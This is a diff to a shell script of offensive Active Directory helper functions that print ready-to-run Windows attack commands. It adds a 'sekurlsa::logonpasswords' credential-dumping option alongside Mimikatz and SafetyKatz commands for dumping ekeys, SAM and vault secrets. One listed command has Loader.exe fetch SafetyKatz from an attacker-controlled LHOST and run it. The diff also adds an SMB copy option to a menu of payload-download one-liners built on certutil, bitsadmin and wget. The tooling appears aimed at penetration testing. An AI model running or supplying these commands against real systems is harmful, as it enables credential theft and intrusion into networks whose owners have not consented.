@@ -844,6 +844,7 @@ nb-ad-pwsh-dump-secrets() {
 
     echo
     __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\\\ArgSplit.bat for example:"
+    __ok "sekurlsa::logonpasswords"
     __ok "sekurlsa::ekeys"
     __ok "lsadump::lsa"
     __ok "lsadump::trust"
@@ -853,27 +854,29 @@ nb-ad-pwsh-dump-secrets() {
 
     echo
     __ask "Choose a command to copy:"
-    echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
-    echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
-    echo "3. Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'"
-    echo "4. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
-    echo "5. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "1. Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'"
+    echo "2. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
+    echo "3. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
+    echo "4. Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'"
+    echo "5. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "6. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
     echo
     echo -n "Choice: "
     read choice
 
     case $choice in
-        1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
-        2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
-        3) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'";;
-        4) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
-        5) 
+        1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'";;
+        2) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
+        3) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
+        4) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'";;
+        5) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
+        6) 
           __ask "For porproxy to localhost use 127.0.0.1"
           nb-vars-set-lhost
           nb-vars-set-lport
           __COMMAND=".\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
           ;;
-        6) exit;;
+        7) exit;;
         *) echo "Invalid option"; exit;;
     esac
 
@@ -902,7 +905,8 @@ nb-ad-pwsh-file-download() {
             echo "3. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
             echo "4. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
             echo "5. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-            echo "6. Previous menu"
+            echo "6. copy \\\\${__RHOST}\\${__SHARE}\\$filename"
+            echo "7. Previous menu"
             echo
             echo -n "Choice: "
             read choice
@@ -919,7 +923,14 @@ nb-ad-pwsh-file-download() {
                 2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                 3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
                 4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-                5) exit;;
+                5) 
+                  echo
+                  __ask "Enter the target machine SMB's server IP"
+                  nb-vars-set-rhost
+                  __check-share
+                  __COMMAND="copy \\\\${__RHOST}\\${__SHARE}\\$filename"
+                  ;;
+                6) exit;;
                 *) echo "Invalid option"; exit;;
             esac
             ;;
